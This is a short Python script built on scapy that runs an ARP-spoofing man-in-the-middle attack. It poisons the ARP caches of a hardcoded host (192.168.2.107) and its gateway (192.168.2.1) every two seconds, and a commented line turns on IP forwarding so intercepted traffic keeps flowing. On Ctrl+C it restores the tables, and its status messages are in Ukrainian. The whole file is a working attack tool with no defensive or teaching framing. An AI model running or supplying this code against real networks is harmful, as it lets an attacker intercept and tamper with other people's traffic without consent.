#!/usr/bin/env python
#echo 1 > /proc/sys/net/ipv4/ip_forward
import time
import scapy.all as scapy

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast,timeout=3,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    #target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)    

def restore(destIP,sourceIP):
    destMac=get_mac(destIP)
    sourceMac=get_mac(sourceIP)
    packet=scapy.ARP(op=2,pdst=destIP,hwdst=destMac,psrc=sourceIP,hwsrc=sourceMac)
    scapy.send(packet,count=4,verbose=False)
   
target_ip="192.168.2.107"
getaway_ip="192.168.2.1"
targetMac=get_mac(target_ip)
getawayMac=get_mac(getaway_ip)
try:
    sent_packets_count=0
    while True:
        target_mac=targetMac
        spoof(target_ip,getaway_ip)
        target_mac=getawayMac
        spoof(getaway_ip,target_ip)
        sent_packets_count+=2
        print("\r[+] Пакетів відправлено: "+str(sent_packets_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Виявлено Ctrl+C .... Відновлення ARP таблиці...Зачекайте!")
    restore(target_ip,getaway_ip)
    restore(getaway_ip,target_ip)